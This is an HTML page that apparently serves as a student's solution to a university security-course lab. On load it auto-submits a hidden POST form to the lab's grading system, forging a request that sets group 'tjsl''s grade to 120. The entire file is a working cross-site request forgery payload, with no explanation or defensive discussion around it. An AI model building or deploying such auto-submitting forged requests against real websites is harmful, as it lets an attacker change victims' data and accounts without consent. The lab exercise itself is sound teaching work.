<!DOCTYPE html>
<html>
<body>
    <form id="f" action="https://cse484.cs.washington.edu/lab2/supersecuregradingsystem/?action=update-grade" method="post" class="form-signin" role="form">
        <div style="width: 50%; margin: auto; padding-top: 5px">
            <input name="groups" value="tjsl">
            <input name="grade"  value="120">
        </div>
    </form>

    <script>
        window.onload = function() {
            document.getElementById('f').submit();
        };
    </script>
</body>
</html>
